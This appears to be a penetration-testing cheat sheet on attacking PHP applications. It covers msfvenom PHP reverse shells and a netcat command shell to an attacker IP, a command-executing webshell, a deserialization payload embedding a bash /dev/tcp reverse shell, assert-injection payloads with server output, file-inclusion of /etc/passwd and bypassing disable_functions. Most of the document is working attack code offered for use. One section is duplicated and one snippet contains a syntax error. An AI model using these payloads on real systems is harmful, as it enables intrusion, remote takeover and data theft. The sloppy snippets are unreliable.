# PHP

## Run code / cmdline

```php
# EXECUTE PHP EXPLOITS
php $FILE
# INTERACTIVE MODE
php -a
php --interactive
php> echo urldecode("");
php > $x = "hello"
php > echo($x)
```

## **PHP** **Windows** **revshell**

```bash
msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=443 -f raw > shell.php
# In case we need PHP code to copy it to a page like Wordpress 404.php
msfvenom -p php/reverse_php LHOST=192.168.0.0 LPORT=443 -f raw
# Then get a more stable revshell doing sth like this:
start /b \\192.168.0.0\share\nc.exe 192.168.0.0 80 -e cmd
```

## **Webshell**

Ignore filetype limitation with Burp by inspecting the request.

{% code overflow="wrap" %}
```php
# First to read a file
<?php
    echo shell_exec("cat $PATH");
?>

# Now the webshell
<?php
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; //with tags to see it nicer line by line
?>
```
{% endcode %}

## Bypass disable\_functions

{% code overflow="wrap" fullWidth="true" %}
```php
https://github.com/TarlogicSecurity/Chankro
Your favourite tool to bypass disable_functions and open_basedir in your pentests.

# Dangerous function checker 
In case we can access phpinfo() or know which functions are disabled, this script will tell us if there is any dangerous function enabled that we can leverage:
<?php
$dangerous_functions = array(['pcntl_alarm','pcntl_fork','pcntl_waitpid','pcntl_wait','pcntl_wifexited','pcntl_wifstopped','pcntl_wifsignaled','pcntl_wifcontinued','pcntl_wexitstatus','pcntl_wtermsig','pcntl_wstopsig','pcntl_signal','pcntl_signal_get_handler','pcntl_signal_dispatch','pcntl_get_last_error','pcntl_strerror','pcntl_sigprocmask','pcntl_sigwaitinfo','pcntl_sigtimedwait','pcntl_exec','pcntl_getpriority','pcntl_setpriority','pcntl_async_signals','error_log','system','exec','shell_exec','popen','proc_open','passthru','link','symlink','syslog','ld','mail','mb_send_mail','imap_open','imap_mail','libvirt_connect','gnupg_init','imagick']);

// Loop through dangerous functions and print if it is enabled
foreach ($dangerous_functions as $function) {
	if (function_exists($function)) {
		echo $function . $ " is enabled\n";
	}
}
```
{% endcode %}

## PHPMyadmin

```bash
# Change someone's password
UPDATE 'table' set 'pass' = 'sdklfjsdlkfj' where 'table'.'ID' = 1;
https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/
```

## Insecure deserialization

{% code overflow="wrap" fullWidth="true" %}
```php
https://notsosecure.com/remote-code-execution-php-unserialize
https://vickieli.dev/insecure%20deserialization/exploiting-php-deserialization/

<?php                                                                                                                                                                        
class Page                                                                                                                                                                   
{                                                                                                                                                                            
    public $file;                                                                                                                                                            
                                                                                                                                                                             
    public function __wakeup()  #this function will be called if we reach unserialize($f) line                                                                                                                                             
    {                                                                                                                                                                        
        include($this->file);   #where we can leverage LFI                                                                                                                                             
    }                                                                                                                                                                        
}                                                                                                                                                                            
                                                                                                                                                                             
if (!isset($_POST['page'])){   # if it is a GET request                                                                                                                                              
        if (strpos(urldecode($_GET['page']),'..')!==false){  # after URL decode, if the parameter has two points (..)-go back path                                                                                                               
                include('/var/www/dev/lfi-prev.html');  # we say LFI was prevented, ouch!!                                                                                                                  
                }                                                                                                                                                            
        else{                                                                                                                                                                
                include('/var/www/dev/'.$_GET['page']); # if not, we include the file (this if-else is well sanitized not exploit                                                                                                             
        }                                                                                                                                                                    
        }                                                                                                                                                                    
else{                                                                                                                                                                        
        $f=$_POST['page'];  # f stores the page parameter content (with POST request)                                                                                                                                                 
        unserialize($f); # this is dangerous because it unserializes data with no sanitization                                                                                                                                                    
}                                                                                                                                                                            
?> 
```
{% endcode %}

We made some comments on the source code. There is LFI prevention but we can exploit it to include our files (LFI) if we reach the flow of **unserialize() function**. To do so, our request has to be POST. When we do it, **magic function** such as **\_\_wakeup()** will get executed and our file parameter will be included successfully.\
\
So we need to research about PHP deserialization. A good resource tell us how to create a serialized object:\
[https://vickieli.dev/insecure%20deserialization/exploiting-php-deserialization/](https://vickieli.dev/insecure%20deserialization/exploiting-php-deserialization/)

We get this code snippet and are told to use it to serialize our data:

```php
class Example2
{
   private $hook = "phpinfo();";
}
print urlencode(serialize(new Example2));
// We need to use URL encoding since we are injecting the object via a URL.
```

We need to enclose it between PHP tags and change the class and variables for the ones in our case we saw on **index.php**:\
\- class is **Page**\
\- variable is **file**\
\- Parameter is any file to include, let's try **/etc/passwd**

This is the previous snippet adapted to our case and call it **serialize.php**

```php
└─$ cat serialize.php
<?php

class Page
{
   private $file = "/etc/passwd";
}
print urlencode(serialize(new Page));

?>
```

We execute it and get our serialized data to inject:

{% code overflow="wrap" %}
```php
└─$ php serialize.php
O%3A4%3A%22Page%22%3A1%3A%7Bs%3A10%3A%22%00Page%00file%22%3Bs%3A11%3A%22%2Fetc%2Fpasswd%22%3B%7D
```
{% endcode %}

If a PHP serialization/deseralization function was found, use it to serialize/deserialize an object. Example:

{% code overflow="wrap" fullWidth="true" %}
```php
└─$ cat serialize.php              
<?php                                                                                                                                                                        
                                                                                                                                                                             
class pingTest {                                                                                                                                                             
        public $ipAddress = "; bash -c 'bash -i >& /dev/tcp/192.168.56.126/443 0>&1'";                                                                                               public $isValid = True;                                                                                                                                             
        public $output = "";    
}

echo urlencode(serialize(new pingTest)); 
?>
  
                                                                                                                                                                                                                                                                                                                                                        
└─$ php serialize.php
O%3A8%3A%22pingTest%22%3A3%3A%7Bs%3A9%3A%22ipAddress%22%3Bs%3A55%3A%22%3B+bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.56.126%2F443+0%3E%261%27%22%3Bs%3A7%3A%22isValid%22%3Bb%3A1%3Bs%3A6%3A%22output%22%3Bs%3A0%3A%22%22%3B%7D
```
{% endcode %}

Another code snippet that works for serializing, copying the structure we saw on index.php source code:

{% code overflow="wrap" fullWidth="true" %}
```php
└─$ cat serialize2.php 
<?php                                                                                                                                                                        
class Page  #class Page content is exactly as we found it on the source code of index.php                                                                                                                                                                 
{                                                                                                                                                                            
        public $file;                                                                                                                                                            
        public function __wakeup()                                                                                                                                               
        {                                                                                                                                                                        
                include($this->file);                                                                                                                                                
        }                                                                                                                                                                        
}

$f = new Page; #instance of the new object for this class
$f->file='/etc/passwd'; #we define a property called file with the attribute/parameter
echo urlencode(serialize($f)); #we serialize and URL-encode it

?>
```
{% endcode %}

## Database

In case we have to connect to MySQL/PostgreSQL/other DB but that mysql/psql binaries are not present -> use PHP PDO

{% code overflow="wrap" fullWidth="true" %}
```sh
https://www.php.net/manual/en/book.pdo.php
php --interactive
php > $connection = new PDO('pgsql:dbname=mydb;host=localhost', 'myuser', 'mypass'); # pgsql or mysql, w/ dbname, user/pass
php > $connect = $connection->query("select * from users"); # make a query
php > $results = $connect->fetchAll();
php > print_r($results);
```
{% endcode %}

## Dangerous functions

[https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720](https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720)

## assert (RCE)

[https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html?highlight=assert#rce-via-assert](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html?highlight=assert#rce-via-assert)

You will need to **break the code syntax, add your payload, and then fix it again**. You can use logic operations such as "and" or "%26%26" or "|". Note that "or", "||" doesn't work because if the first condition is true our payload won't get executed. The same way ";" doesn't work as our payload won't be executed.

{% code overflow="wrap" fullWidth="true" %}
```bash
# Example of assert error
is_numeric('') !== false

# Since our first condition is false...

# break the code syntax
x')																'
# add your payload
or system('ls')
# fix it again
and is_numeric('a																	'

# Join your payload all together
amount=a') or system('ls') and is_numeric('a

# The whole body parameter would be
from=Alice&fromaddr=1234%20Main%20St&to=Bob&toaddr=5678%20Elm%20St&amount=a')%20or%20system('ls')%20and%20is_numeric('a&comments=Payment%20for%20July%20rent&cmd=id

# And the response is
...
addTransaction.php
index.php
license.txt
script.js
style.css
Assertion Failed:<br/>
            Invalid value for amount<br />
            At line '23' : 'is_numeric('x') or system('ls') and is_numeric('a') !== false'<br />

# break the code syntax
x')																'
# add your payload
or system('ls')
# fix it again
and is_numeric('a																	'

# Join your payload all together
amount=a') or system('ls') and is_numeric('a

# The whole body parameter would be
from=Alice&fromaddr=1234%20Main%20St&to=Bob&toaddr=5678%20Elm%20St&amount=a')%20or%20system('ls')%20and%20is_numeric('a&comments=Payment%20for%20July%20rent&cmd=id

# And the response is
...
addTransaction.php
index.php
license.txt
script.js
style.css
Assertion Failed:<br/>
            Invalid value for amount<br />
            At line '23' : 'is_numeric('x') or system('ls') and is_numeric('a') !== false'<br />
```
{% endcode %}

## Commands and functions

```
https://www.w3schools.com/PHP/php_ref_directory.asp
scandir, file_get_contents("")
getcwd(), get_current_user()

possible to read/write files

execute commands with different functions

require/include abuse
```

## phpinfo() - Find file

{% code overflow="wrap" %}
```sh
Path example is /etc/php5/apache2/php.ini

# check disable_functions to see if we cannot use system, shell_exec, passthru... or anything is allowed
allow_url_include → if on, it allows RFI
file_uploads -> if on, try 

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi-to-rce-via-phpinfo or https://github.com/roughiz/lfito_rce, search also php file upload boundary to know structure

https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo
Python Script has to be modified to include PHP revshell, change PHPinfo path and also LFI path
```
{% endcode %}

## Inspect PHP code

```bash
grep -Hira 'exec\|passthru\|popen\|proc_open\|shell_exec\|system\|call_user_func'  .
```

## Fuzz allowed extensions

```bash
#CREATE A FILE WITH FEW EXTENSIONS
cat phpext.txt
.php
.php2
.php3
.php5
.phphtml
...

#Use Intruder with the upload form to check which are allowed
```

## Adminer

[https://0xdf.gitlab.io/2020/09/26/htb-admirer.html](https://0xdf.gitlab.io/2020/09/26/htb-admirer.html)

[https://ine.com/blog/adminer-ssrf-vulnerability-cve-202121311+](https://ine.com/blog/adminer-ssrf-vulnerability-cve-202121311+)

## phpbash (semi-interactive webshel&#x6C;**)**

{% embed url="https://github.com/Arrexel/phpbash/blob/master/phpbash.php" %}
